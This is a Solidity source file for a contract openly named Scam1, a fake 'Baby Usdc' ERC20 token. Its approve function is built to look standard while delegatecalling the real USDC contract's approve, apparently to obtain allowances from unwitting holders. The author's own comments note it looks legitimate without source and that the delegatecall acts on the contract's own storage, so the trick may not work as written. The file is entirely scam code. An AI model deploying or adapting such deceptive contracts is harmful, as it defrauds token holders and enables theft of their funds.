// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract Scam1 is ERC20 {
    IERC20 usdcContract;

    constructor(address usdcContractAddress) ERC20("Baby Usdc", "BBUSDC") {
        usdcContract = IERC20(usdcContractAddress);
    }

    // this function matches 100% the standard ERC20 ABI/interface, without source code it looks legit
    function approve(address spender, uint256 amount) public override returns (bool) {
        super.approve(spender, amount);

        // with delegate call we attempt to make Scam contract approve Usdc contract in the name of owner
        // with delegate we manage to execute Usdc.approve in `this` context to pass msg.sender
        // however we pass `this` storage too
        address(usdcContract).delegatecall(abi.encodeWithSignature("approve(address,uint256)", spender, amount - 100));

        return true;
    }
}
